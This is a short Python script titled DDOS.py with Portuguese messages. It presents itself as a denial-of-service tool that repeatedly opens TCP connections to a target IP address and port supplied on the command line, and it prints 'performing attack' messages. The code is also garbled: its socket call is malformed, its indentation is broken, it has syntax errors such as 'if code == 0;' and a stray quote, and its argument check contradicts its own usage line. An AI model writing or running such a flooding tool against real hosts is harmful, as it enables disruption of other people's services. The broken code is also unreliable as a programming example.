import socket
import sys
import os

main = """

____  ____   ___  ____  
|  _ \|  _ \ / _ \/ ___| 
| | | | | | | | | \___ \ 
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/ 


Powered by Moderno\ n\ n """
count = 0

def init(ip, port, main):
    client = socket.socket(socket.AF_INET, socket, SOCK_STREAM)
client.settimeout(0.03)
code = client.connect_ex((ip, int(port)))
if code == 0;
print("[==>] - Realizando ataque ")
print("IP: %s, PORT:%s", ip, port)
else :
    '      print("Servido idisponivel ou porta fechada\n")

if len(sys.argv) < 5:
    print('\n\n')
print("Modo de uso:")
print("Exe: root@localhost~# python DDOS.py 192.168.1.1 80")
print('\n\n')
sys.exit(0)

else :

    ip = sys.argv[1]
port = sys.argv[2]
quantia = int(sys.argv[3])
while count < quantia:
    count += 1
init(ip, port, main)
print([!] "DDOS PARADO")